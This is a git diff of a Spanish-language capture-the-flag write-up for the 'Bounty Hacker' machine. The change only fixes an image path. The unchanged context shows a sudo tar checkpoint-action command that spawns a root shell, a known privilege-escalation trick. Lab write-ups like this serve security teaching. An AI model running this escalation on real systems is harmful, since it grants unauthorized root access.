@@ -155,6 +155,6 @@ Resultado: obtienes una shell como root y control total del sistema.
 ```bash
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
-![root](imagenes/root.png)
+![root](Maquina_de_Linux/Bounty-Hacker/imagenes/root.png)
 
  Ahora somos  root.
